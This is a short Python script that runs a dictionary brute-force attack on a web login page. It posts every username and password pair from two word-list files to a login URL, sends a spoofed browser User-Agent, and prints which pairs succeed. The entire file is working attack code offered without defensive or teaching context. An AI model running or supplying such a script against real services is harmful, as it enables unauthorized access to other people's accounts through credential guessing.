import requests

# Set the URL of the login page
url = 'http://example.com/login'

# Set the headers to be sent with the request
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'X-Custom-Header': 'Some Custom Value'
}

# Open the dicts
with open('usernames.txt', 'r') as username_file:
    usernames = username_file.read().splitlines()

with open('passwords.txt', 'r') as password_file:
    passwords = password_file.read().splitlines()

# Try every combination of username and password
for username in usernames:
    for password in passwords:
        # Construct the request payload
        payload = {'username': username, 'password': password}

        # Send the request with the payload and headers
        response = requests.post(url, json=payload, headers=headers)
        
        # Check if the login was successful
        if response.status_code == 200:
            print(f'Success: {username}:{password}')
        else:
            print(f'Failed: {username}:{password}')